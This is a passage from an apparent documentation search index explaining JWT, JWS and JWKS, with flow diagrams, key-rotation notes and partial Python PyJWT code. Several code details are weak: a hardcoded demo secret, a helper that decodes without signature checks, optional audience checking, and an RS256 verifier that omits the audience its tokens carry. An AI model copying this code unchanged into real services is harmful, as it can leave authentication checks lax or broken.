\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518              \u2193                             \u2502\n\u2502                            Verify matches                     \u2502\n\u2502                                                               \u2502\n\u2502  \u2705 Better Security: API server CANNOT create tokens        \u2502\n\u2502     Only auth server with private key can sign               \u2502\n\u2502                                                               \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/jwt/#jwt-issuance-flow","title":"JWT Issuance Flow","text":""},{"location":"security/jwt/#complete-authentication-flow","title":"Complete Authentication Flow","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Client  \u2502                                              \u2502 Auth Server  \u2502\n\u2502 (Browser)\u2502                                              \u2502   (Issuer)   \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                                              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                            \u2502\n     \u2502  1. Login Request (POST /login)                           \u2502\n     \u2502    {username: \"john\", password: \"secret\"}                 \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                                            \u2502\n     \u2502                                   2. Validate Credentials \u2502\n     \u2502                                      \u2713 Check DB           \u2502\n     \u2502                                      \u2713 Verify password    \u2502\n     \u2502                                            \u2502               \u2502\n     \u2502                                   3. Create JWT           \u2502\n     \u2502                                      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502\n     \u2502                                      \u2502 HEADER       \u2502     \u2502\n     \u2502                                      \u2502 {\"alg\":\"RS256\"}    \u2502\n     \u2502                                      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2502\n     \u2502                                      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502\n     \u2502                                      \u2502 PAYLOAD      \u2502     \u2502\n     \u2502                                      \u2502 {sub: \"123\"} \u2502     \u2502\n     \u2502                                      \u2502 {exp: ...}   \u2502     \u2502\n     \u2502                                      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2502\n     \u2502                                      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502\n     \u2502                                      \u2502 SIGNATURE    \u2502     \u2502\n     \u2502                                      \u2502 (with priv key)    \u2502\n     \u2502                                      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2502\n     \u2502                                            \u2502               \u2502\n     \u2502  4. Return JWT                                            \u2502\n     \u2502  {token: \"eyJhbGci...\", expiresIn: 3600}                  \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                                                            \u2502\n     \u2502  5. Store JWT (localStorage/cookie)                       \u2502\n     \u2502  \u2705 Saved                                                 \u2502\n     \u2502                                                            \u2502\n     \u25bc                                                            \u25bc\n\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Client  \u2502                                              \u2502  API Server  \u2502\n\u2502 (Browser)\u2502                                              \u2502  (Resource)  \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                                              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                            \u2502\n     \u2502  6. API Request with JWT                                  \u2502\n     \u2502  GET /api/user/profile                                    \u2502\n     \u2502  Authorization: Bearer eyJhbGci...                        \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                                            \u2502\n     \u2502                                   7. Verify JWT           \u2502\n     \u2502                                      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502\n     \u2502                                      \u2502 Extract JWT  \u2502     \u2502\n     \u2502                                      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2502\n     \u2502                                             \u2502              \u2502\n     \u2502                                      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502\n     \u2502                                      \u2502 Split into   \u2502     \u2502\n     \u2502                                      \u2502 Header.      \u2502     \u2502\n     \u2502                                      \u2502 Payload.     \u2502     \u2502\n     \u2502                                      \u2502 Signature    \u2502     \u2502\n     \u2502                                      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2502\n     \u2502                                             \u2502              \u2502\n     \u2502                                      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502\n     \u2502                                      \u2502 Get Public   \u2502     \u2502\n     \u2502                                      \u2502 Key (JWKS)   \u2502     \u2502\n     \u2502                                      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2502\n     \u2502                                             \u2502              \u2502\n     \u2502                                      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502\n     \u2502                                      \u2502 Verify       \u2502     \u2502\n     \u2502                                      \u2502 Signature    \u2502     \u2502\n     \u2502                                      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2502\n     \u2502                                             \u2502              \u2502\n     \u2502                                      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502\n     \u2502                                      \u2502 Validate     \u2502     \u2502\n     \u2502                                      \u2502 Claims       \u2502     \u2502\n     \u2502                                      \u2502 (exp, aud)   \u2502     \u2502\n     \u2502                                      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2502\n     \u2502                                             \u2502              \u2502\n     \u2502                                      \u2705 Valid             \u2502\n     \u2502                                             \u2502              \u2502\n     \u2502  8. Return Protected Resource                             \u2502\n     \u2502  {id: 123, name: \"John\", email: \"...\"}                    \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                                                            \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/jwt/#jws-json-web-signature","title":"JWS (JSON Web Signature)","text":"<p>JWS is the specification (RFC 7515) that defines how to digitally sign content using JSON. JWT is actually a type of JWS with JSON claims in the payload.</p>"},{"location":"security/jwt/#jws-structure","title":"JWS Structure","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    JWS Components                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                             \u2502\n\u2502  1. JOSE Header (JSON Object Signing and Encryption)       \u2502\n\u2502     \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500               \u2502\n\u2502     Contains metadata about the signature                  \u2502\n\u2502     {\"alg\": \"RS256\", \"typ\": \"JWT\", \"kid\": \"key-123\"}      \u2502\n\u2502                                                             \u2502\n\u2502  2. JWS Payload                                            \u2502\n\u2502     \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                           \u2502\n\u2502     The actual content being signed                        \u2502\n\u2502     Can be ANY content (not just JWT claims)               \u2502\n\u2502                                                             \u2502\n\u2502  3. JWS Signature                                          \u2502\n\u2502     \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                         \u2502\n\u2502     Digital signature of header + payload                  \u2502\n\u2502                                                             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/jwt/#jws-serialization-formats","title":"JWS Serialization Formats","text":"<p>1. Compact Serialization (Most Common): <pre><code>BASE64URL(UTF8(JWS Header)) || '.' ||\nBASE64URL(JWS Payload) || '.' ||\nBASE64URL(JWS Signature)\n\nExample:\neyJhbGci...J9.eyJzdWI...iJ9.SflKxw...ssw5c\n</code></pre></p> <p>2. JSON Serialization (Multiple Signatures): <pre><code>{\n  \"payload\": \"eyJzdWI...\",\n  \"signatures\": [\n    {\n      \"protected\": \"eyJhbGci...\",\n      \"header\": {\"kid\": \"key-1\"},\n      \"signature\": \"DtEhU3...\"\n    },\n    {\n      \"protected\": \"eyJhbGci...\",\n      \"header\": {\"kid\": \"key-2\"},\n      \"signature\": \"8BYT5X...\"\n    }\n  ]\n}\n</code></pre></p>"},{"location":"security/jwt/#jws-vs-jwt","title":"JWS vs JWT","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                       JWS vs JWT                           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502     JWS      \u2502  Specification for signing JSON content     \u2502\n\u2502              \u2502  Can sign ANY payload                       \u2502\n\u2502              \u2502  RFC 7515                                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502     JWT      \u2502  Specific use of JWS for authentication     \u2502\n\u2502              \u2502  Payload MUST be JSON claims                \u2502\n\u2502              \u2502  RFC 7519                                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Relationship \u2502  JWT is a JWS with claims as payload       \u2502\n\u2502              \u2502  Every JWT is a JWS                         \u2502\n\u2502              \u2502  Not every JWS is a JWT                     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/jwt/#jwks-json-web-key-set","title":"JWKS (JSON Web Key Set)","text":"<p>JWKS is a set of public keys used to verify JWTs issued by an authorization server. It's typically exposed as a JSON document at a well-known URL.</p>"},{"location":"security/jwt/#jwks-structure","title":"JWKS Structure","text":"<pre><code>{\n  \"keys\": [\n    {\n      // Key Type\n      \"kty\": \"RSA\",\n\n      // Public Key Use\n      \"use\": \"sig\",\n\n      // Key ID (for key rotation)\n      \"kid\": \"key-2024-01\",\n\n      // Algorithm\n      \"alg\": \"RS256\",\n\n      // RSA Public Key Components\n      \"n\": \"0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAt...\",\n      \"e\": \"AQAB\",\n\n      // X.509 Certificate Chain (optional)\n      \"x5c\": [\"MIIDQjCCAiqgAwIBAgIGATz...\"],\n\n      // X.509 Thumbprint\n      \"x5t\": \"GF8IDz...\",\n      \"x5t#S256\": \"jMI7H...\"\n    },\n    {\n      \"kty\": \"RSA\",\n      \"use\": \"sig\",\n      \"kid\": \"key-2024-02\",\n      \"alg\": \"RS256\",\n      \"n\": \"xjlw2VhYs...\",\n      \"e\": \"AQAB\"\n    }\n  ]\n}\n</code></pre>"},{"location":"security/jwt/#jwks-properties","title":"JWKS Properties","text":"Property Description Example kty Key Type \"RSA\", \"EC\", \"oct\" use Public Key Use \"sig\" (signature), \"enc\" (encryption) key_ops Key Operations [\"sign\", \"verify\"] alg Algorithm \"RS256\", \"ES256\" kid Key ID (unique identifier) \"key-2024-01\" n RSA modulus (Base64URL) \"0vx7ago...\" e RSA exponent \"AQAB\" (65537) x5c X.509 certificate chain [\"MIID...\"] x5t X.509 SHA-1 thumbprint \"GF8IDz...\" x5t#S256 X.509 SHA-256 thumbprint \"jMI7H...\" crv Elliptic Curve (for EC) \"P-256\", \"P-384\" x EC x coordinate \"f83OJ3...\" y EC y coordinate \"x_FEzR...\""},{"location":"security/jwt/#jwks-endpoint-discovery","title":"JWKS Endpoint Discovery","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502            OpenID Connect Discovery Flow                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                             \u2502\n\u2502  Step 1: Discover OpenID Configuration                     \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                    \u2502\n\u2502  GET https://auth.example.com/.well-known/openid-configuration\n\u2502                                                             \u2502\n\u2502  Response:                                                  \u2502\n\u2502  {                                                          \u2502\n\u2502    \"issuer\": \"https://auth.example.com\",                   \u2502\n\u2502    \"authorization_endpoint\": \"https://auth.../authorize\",  \u2502\n\u2502    \"token_endpoint\": \"https://auth.../token\",              \u2502\n\u2502    \"jwks_uri\": \"https://auth.../jwks.json\",  \u2190 Important! \u2502\n\u2502    \"response_types_supported\": [\"code\", \"token\"],          \u2502\n\u2502    ...                                                      \u2502\n\u2502  }                                                          \u2502\n\u2502                                                             \u2502\n\u2502  Step 2: Fetch JWKS                                        \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                       \u2502\n\u2502  GET https://auth.example.com/jwks.json                    \u2502\n\u2502                                                             \u2502\n\u2502  Response:                                                  \u2502\n\u2502  {                                                          \u2502\n\u2502    \"keys\": [                                               \u2502\n\u2502      {\"kty\": \"RSA\", \"kid\": \"key-1\", \"n\": \"...\", \"e\": \"...\"} \u2502\n\u2502    ]                                                        \u2502\n\u2502  }                                                          \u2502\n\u2502                                                             \u2502\n\u2502  Step 3: Verify JWT                                        \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                       \u2502\n\u2502  1. Parse JWT header \u2192 get \"kid\"                           \u2502\n\u2502  2. Find matching key in JWKS                              \u2502\n\u2502  3. Verify signature with public key                       \u2502\n\u2502  4. Validate claims                                        \u2502\n\u2502                                                             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/jwt/#jwks-key-rotation","title":"JWKS Key Rotation","text":"<pre><code>Key Rotation Strategy:\n\nTime: Day 0                    Day 30                  Day 60\n      \u2502                         \u2502                        \u2502\n      \u25bc                         \u25bc                        \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510             \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510             \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  JWKS    \u2502             \u2502  JWKS    \u2502             \u2502  JWKS    \u2502\n\u2502          \u2502             \u2502          \u2502             \u2502          \u2502\n\u2502 key-jan  \u2502 \u2190 Active    \u2502 key-jan  \u2502             \u2502 key-feb  \u2502\n\u2502          \u2502             \u2502 key-feb  \u2502 \u2190 Active    \u2502 key-mar  \u2502 \u2190 Active\n\u2502          \u2502             \u2502          \u2502             \u2502          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518             \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518             \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nProcess:\n1. Generate new key (key-feb) on Day 25\n2. Add to JWKS alongside old key (key-jan)\n3. Start signing with new key on Day 30\n4. Keep old key for verification (grace period)\n5. Remove old key after all JWTs expire (Day 60)\n\nBenefits:\n\u2705 Zero downtime during rotation\n\u2705 Old JWTs still valid during transition\n\u2705 Security: Limit key exposure window\n</code></pre>"},{"location":"security/jwt/#complete-python-implementation","title":"Complete Python Implementation","text":""},{"location":"security/jwt/#installation","title":"Installation","text":"<pre><code>pip install pyjwt cryptography\n</code></pre>"},{"location":"security/jwt/#creating-and-verifying-jwts","title":"Creating and Verifying JWTs","text":"<pre><code>import jwt\nimport json\nimport time\nfrom datetime import datetime, timedelta\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.backends import default_backend\n\n# ============================================================\n# 1. HMAC (HS256) - Symmetric Signing\n# ============================================================\n\nclass JWTServiceHS256:\n    \"\"\"JWT service using HMAC-SHA256 (symmetric)\"\"\"\n\n    def __init__(self, secret_key: str):\n        self.secret = secret_key\n        self.algorithm = \"HS256\"\n\n    def create_token(self, user_id: str, email: str, \n                    role: str = \"user\", expires_in: int = 3600):\n        \"\"\"\n        Create a JWT token.\n\n        Args:\n            user_id: Unique user identifier\n            email: User email\n            role: User role (admin, user, etc.)\n            expires_in: Token lifetime in seconds\n\n        Returns:\n            JWT token string\n        \"\"\"\n        now = datetime.utcnow()\n\n        # Define payload claims\n        payload = {\n            # Registered claims\n            \"iss\": \"https://auth.myapp.com\",  # Issuer\n            \"sub\": user_id,                    # Subject (user ID)\n            \"aud\": \"https://api.myapp.com\",   # Audience\n            \"exp\": now + timedelta(seconds=expires_in),  # Expiration\n            \"iat\": now,                        # Issued at\n            \"nbf\": now,                        # Not before\n            \"jti\": f\"jwt_{user_id}_{int(time.time())}\",  # JWT ID\n\n            # Public claims\n            \"email\": email,\n            \"email_verified\": True,\n\n            # Private claims\n            \"role\": role,\n            \"permissions\": [\"read\", \"write\"] if role == \"admin\" else [\"read\"]\n        }\n\n        # Create JWT\n        token = jwt.encode(\n            payload,\n            self.secret,\n            algorithm=self.algorithm\n        )\n\n        return token\n\n    def verify_token(self, token: str, expected_audience: str = None):\n        \"\"\"\n        Verify and decode a JWT token.\n\n        Args:\n            token: JWT token string\n            expected_audience: Expected audience value\n\n        Returns:\n            Decoded payload dictionary\n        \"\"\"\n        try:\n            # Verify and decode\n            payload = jwt.decode(\n                token,\n                self.secret,\n                algorithms=[self.algorithm],\n                audience=expected_audience,\n                options={\n                    \"verify_signature\": True,\n                    \"verify_exp\": True,\n                    \"verify_nbf\": True,\n                    \"verify_iat\": True,\n                    \"verify_aud\": True if expected_audience else False\n                }\n            )\n\n            return {\n                \"valid\": True,\n                \"payload\": payload\n            }\n\n        except jwt.ExpiredSignatureError:\n            return {\"valid\": False, \"error\": \"Token has expired\"}\n\n        except jwt.InvalidTokenError as e:\n            return {\"valid\": False, \"error\": str(e)}\n\n    def decode_without_verification(self, token: str):\n        \"\"\"Decode token without verifying (for debugging)\"\"\"\n        return jwt.decode(token, options={\"verify_signature\": False})\n\n\n# Example Usage: HS256\nprint(\"=\" * 60)\nprint(\"HMAC-SHA256 (HS256) Example\")\nprint(\"=\" * 60)\n\njwt_service = JWTServiceHS256(secret_key=\"my-super-secret-key-keep-this-safe\")\n\n# Create token\ntoken = jwt_service.create_token(\n    user_id=\"user_12345\",\n    email=\"john@example.com\",\n    role=\"admin\",\n    expires_in=3600  # 1 hour\n)\n\nprint(f\"\\n\u2705 Generated JWT:\\n{token}\\n\")\n\n# Decode header and payload (without verification)\nparts = token.split('.')\nprint(f\"Parts: {len(parts)} (Header.Payload.Signature)\\n\")\n\n# Verify token\nresult = jwt_service.verify_token(token, expected_audience=\"https://api.myapp.com\")\nprint(f\"\u2705 Verification Result:\")\nprint(f\"Valid: {result['valid']}\")\nif result['valid']:\n    print(f\"User ID: {result['payload']['sub']}\")\n    print(f\"Email: {result['payload']['email']}\")\n    print(f\"Role: {result['payload']['role']}\")\n    print(f\"Expires: {datetime.fromtimestamp(result['payload']['exp'])}\")\n\n\n# ============================================================\n# 2. RSA (RS256) - Asymmetric Signing\n# ============================================================\n\nclass JWTServiceRS256:\n    \"\"\"JWT service using RSA-SHA256 (asymmetric)\"\"\"\n\n    def __init__(self):\n        # Generate RSA key pair\n        self.private_key = rsa.generate_private_key(\n            public_exponent=65537,\n            key_size=2048,\n            backend=default_backend()\n        )\n        self.public_key = self.private_key.public_key()\n        self.algorithm = \"RS256\"\n        self.kid = \"key-2024-01\"\n\n    def create_token(self, user_id: str, email: str, \n                    role: str = \"user\", expires_in: int = 3600):\n        \"\"\"Create JWT with RSA signature\"\"\"\n        now = datetime.utcnow()\n\n        payload = {\n            \"iss\": \"https://auth.myapp.com\",\n            \"sub\": user_id,\n            \"aud\": \"https://api.myapp.com\",\n            \"exp\": now + timedelta(seconds=expires_in),\n            \"iat\": now,\n            \"email\": email,\n            \"role\": role\n        }\n\n        # Add kid to header\n        headers = {\"kid\": self.kid}\n\n        # Sign with private key\n        private_pem = self.private_key.private_bytes(\n            encoding=serialization.Encoding.PEM,\n            format=serialization.PrivateFormat.PKCS8,\n            encryption_algorithm=serialization.NoEncryption()\n        )\n\n        token = jwt.encode(\n            payload,\n            private_pem,\n            algorithm=self.algorithm,\n            headers=headers\n        )\n\n        return token\n\n    def verify_token(self, token: str):\n        \"\"\"Verify JWT with public key\"\"\"\n        try:\n            # Get public key PEM\n            public_pem = self.public_key.public_bytes(\n                encoding=serialization.Encoding.PEM,\n                format=serialization.PublicFormat.SubjectPublicKeyInfo\n            )\n\n            # Verify with public key\n            payload = jwt.decode(\n                token,\n                public_pem,\n                algorithms=[self.algorithm]\n            )\n\n            return {\"valid\": True, \"payload\": payload}\n\n        except jwt.InvalidTokenError as e:\n            return {\"valid\": False, \"error\": str(e)}\n\n    def get_jwks(self):\n        \"\"\"Generate JWKS (JSON Web Key Set)\"\"\"\n        from 